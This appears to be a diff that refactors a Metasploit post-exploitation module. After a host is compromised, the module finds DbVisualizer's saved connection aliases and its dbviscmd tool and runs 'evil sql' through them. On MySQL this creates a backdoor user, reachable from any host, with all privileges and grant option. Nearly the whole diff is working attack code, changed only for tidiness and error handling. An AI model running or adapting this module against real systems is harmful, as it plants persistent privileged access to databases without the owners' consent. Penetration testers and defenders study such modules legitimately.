@@ -32,6 +32,11 @@ class MetasploitModule < Msf::Post
               stdapi_sys_config_getenv
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [CONFIG_CHANGES],
+          'Reliability' => []
         }
       )
     )
@@ -47,18 +52,26 @@ class MetasploitModule < Msf::Post
 
   def run
     db_type = exist_and_supported
-    unless db_type.blank?
-      dbvis = find_dbviscmd
-      unless dbvis.blank?
-        sql = get_sql(db_type)
-        errors = dbvis_query(dbvis, sql)
-        if errors == true
-          print_error('No luck today, access is probably denied for configured user !? Try in verbose mode to know what happened. ')
-        else
-          print_good("Privileged user created ! Try now to connect with user : #{datastore['DBUSERNAME']} and password : #{datastore['DBPASSWORD']}")
-        end
-      end
+
+    return if db_type.blank?
+
+    sql = get_sql(db_type)
+
+    if sql.blank?
+      print_error("Could not generate SQL. Unsupported database type: #{db_type}")
+      return
     end
+
+    dbvis = find_dbviscmd
+
+    return if dbvis.blank?
+
+    unless dbvis_query(dbvis, sql)
+      print_error('No luck today, access is probably denied for configured user !? Try in verbose mode to know what happened. ')
+      return
+    end
+
+    print_good("Privileged user created ! Try now to connect with user : #{datastore['DBUSERNAME']} and password : #{datastore['DBPASSWORD']}")
   end
 
   # Check if the alias exist and if database is supported by this script
@@ -93,16 +106,17 @@ class MetasploitModule < Msf::Post
         print_error("File not found: #{dbvis_file}")
         return
       end
-
-      old_version = true
     end
 
     print_status("Reading : #{dbvis_file}")
     raw_xml = ''
     begin
       raw_xml = read_file(dbvis_file)
-    rescue EOFError
-      # If there's nothing in the file, we hit EOFError
+    rescue EOFError => e
+      vprint_error(e.message)
+    end
+
+    if raw_xml.blank?
       print_error("Nothing read from file: #{dbvis_file}, file may be empty")
       return
     end
@@ -145,9 +159,11 @@ class MetasploitModule < Msf::Post
       end
       alias_found = false
     end
+
     if db_type.blank?
       print_error('Database alias not found in dbvis.xml')
     end
+
     return db_type # That is empty if DB is not supported
   end
 
@@ -156,12 +172,11 @@ class MetasploitModule < Msf::Post
     case session.platform
     when 'linux'
       dbvis = session.shell_command('locate dbviscmd.sh').chomp
-      if dbvis.chomp == ''
+      if dbvis.blank?
         print_error('dbviscmd.sh not found')
         return nil
-      else
-        print_good("Dbviscmd found : #{dbvis}")
       end
+      print_good("Dbviscmd found : #{dbvis}")
     when 'windows'
       # Find program files
       progfiles_env = session.sys.config.getenvs('ProgramFiles(X86)', 'ProgramFiles')
@@ -198,28 +213,29 @@ class MetasploitModule < Msf::Post
 
   # Query execution method
   def dbvis_query(dbvis, sql)
-    error = false
-    resp = ''
-    if file?(dbvis) == true
-      f = session.fs.file.stat(dbvis)
-      if (f.uid == Process.euid) || Process.groups.include?(f.gid)
-        print_status('Trying to execute evil sql, it can take time ...')
-        args = "-connection #{datastore['DBALIAS']} -sql \"#{sql}\""
-        dbvis = "\"#{dbvis}\""
-        cmd = "#{dbvis} #{args}"
-        resp = cmd_exec(cmd)
-        vprint_line
-        vprint_status(resp.to_s)
-        if resp =~ /denied|failed/i
-          error = true
-        end
-      else
-        print_error("User doesn't have enough rights to execute dbviscmd, aborting")
+    unless file?(dbvis)
+      print_error("#{dbvis} is not a file")
+      return false
+    end
+
+    f = session.fs.file.stat(dbvis)
+    if (f.uid == Process.euid) || Process.groups.include?(f.gid)
+      print_status('Trying to execute evil sql, it can take time ...')
+      args = "-connection #{datastore['DBALIAS']} -sql \"#{sql}\""
+      dbvis = "\"#{dbvis}\""
+      cmd = "#{dbvis} #{args}"
+      resp = cmd_exec(cmd)
+      vprint_line
+      vprint_status(resp.to_s)
+      if resp =~ /denied|failed/i
+        return false
       end
     else
-      print_error("#{dbvis} is not a file")
+      print_error("User doesn't have enough rights to execute dbviscmd, aborting")
+      return false
     end
-    return error
+
+    true
   end
 
   # Database dependent part
@@ -231,14 +247,13 @@ class MetasploitModule < Msf::Post
 
   # Build proper sql
   def get_sql(db_type)
-    if db_type =~ /mysql/i
-      sql = "CREATE USER '#{datastore['DBUSERNAME']}'@'localhost' IDENTIFIED BY '#{datastore['DBPASSWORD']}';"
-      sql << "GRANT ALL PRIVILEGES ON *.* TO '#{datastore['DBUSERNAME']}'@'localhost' WITH GRANT OPTION;"
+    return unless db_type =~ /mysql/i
 
-      sql << "CREATE USER '#{datastore['DBUSERNAME']}'@'%' IDENTIFIED BY '#{datastore['DBPASSWORD']}';"
-      sql << "GRANT ALL PRIVILEGES ON *.* TO '#{datastore['DBUSERNAME']}'@'%' WITH GRANT OPTION;"
-      return sql
-    end
-    return nil
+    sql = "CREATE USER '#{datastore['DBUSERNAME']}'@'localhost' IDENTIFIED BY '#{datastore['DBPASSWORD']}';"
+    sql << "GRANT ALL PRIVILEGES ON *.* TO '#{datastore['DBUSERNAME']}'@'localhost' WITH GRANT OPTION;"
+    sql << "CREATE USER '#{datastore['DBUSERNAME']}'@'%' IDENTIFIED BY '#{datastore['DBPASSWORD']}';"
+    sql << "GRANT ALL PRIVILEGES ON *.* TO '#{datastore['DBUSERNAME']}'@'%' WITH GRANT OPTION;"
+
+    sql
   end
 end
